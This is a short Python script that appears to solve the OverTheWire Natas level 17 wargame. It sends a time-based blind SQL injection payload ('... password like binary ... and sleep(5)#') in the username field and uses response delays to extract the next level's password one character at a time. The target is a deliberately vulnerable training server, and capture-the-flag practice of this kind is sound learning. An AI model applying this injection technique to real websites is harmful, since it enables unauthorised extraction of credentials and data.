import string
import sys
import requests

def bruteforce_user_password():

    url = "http://natas17.natas.labs.overthewire.org"

    session = requests.Session()

    auth=("natas17",sys.argv[1])

    response = session.get(url, auth=auth)

    password = ""

    password_chars = list(string.ascii_letters + string.digits)

    while len(password) != 32:

        for char in password_chars:

            data = {
                "username": f"""natas18" and password like binary '{password + char}%' and sleep(5)#"""
            }

            print(f"data : {data}")

            response = session.post(url + "/index.php?debug=1", auth=auth, data=data)

            # print(response.text)

            # print(response.elapsed.total_seconds)

            if response.elapsed.total_seconds() >= 5:
                password = password + char

    print(password)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage python.py <file.py> natas_password")
    bruteforce_user_password()
